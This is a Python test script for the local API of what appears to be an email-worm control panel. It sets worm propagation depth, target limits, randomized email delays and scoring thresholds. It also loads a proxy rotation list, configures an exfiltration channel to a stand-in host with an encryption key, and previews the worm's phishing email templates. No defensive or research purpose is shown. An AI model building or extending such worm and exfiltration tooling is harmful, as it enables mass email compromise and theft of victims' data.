#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://127.0.0.1:5000"

# Test 1: Test worm config update
print("=" * 60)
print("Test 1: Worm Config Update")
print("=" * 60)
resp = requests.post(f"{BASE_URL}/api/worm/config/update", json={
    "max_depth": 3,
    "max_targets": 10,
    "parallel_pollers": 3,
    "min_email_delay": 20,
    "max_email_delay": 60,
    "min_score_threshold": 3,
    "enabled": True
}, timeout=5)
print(f"Status: {resp.status_code}")
print(f"Response: {json.dumps(resp.json(), indent=2)}")

# Test 2: Test proxy settings
print("\n" + "=" * 60)
print("Test 2: Proxy Settings")
print("=" * 60)
resp = requests.post(f"{BASE_URL}/api/settings/proxy", json={
    "proxy_list": "http://proxy1.com:8080,http://proxy2.com:8080,socks5://proxy3.com:1080"
}, timeout=5)
print(f"Status: {resp.status_code}")
print(f"Response: {json.dumps(resp.json(), indent=2)}")

# Test 3: Test exfil settings
print("\n" + "=" * 60)
print("Test 3: Exfil Settings")
print("=" * 60)
exfil_config = json.dumps({"channels": [{"type": "http", "url": "http://example.com"}]})
resp = requests.post(f"{BASE_URL}/api/settings/exfil", json={
    "exfil_config": exfil_config,
    "encryption_key": "0123456789abcdef0123456789abcdef"
}, timeout=5)
print(f"Status: {resp.status_code}")
print(f"Response: {json.dumps(resp.json(), indent=2)}")

# Test 4: Worm template preview
print("\n" + "=" * 60)
print("Test 4: Worm Template Preview")
print("=" * 60)
resp = requests.get(f"{BASE_URL}/api/worm/template/preview", timeout=5)
print(f"Status: {resp.status_code}")
data = resp.json()
print(f"Has HTML: {'html_template' in data}")
print(f"Has TXT: {'txt_template' in data}")
print(f"Success: {data.get('success', False)}")
if 'html_template' in data:
    print(f"HTML template length: {len(data['html_template'])}")
if 'txt_template' in data:
    print(f"TXT template length: {len(data['txt_template'])}")

print("\n" + "=" * 60)
print("All tests completed!")
print("=" * 60)
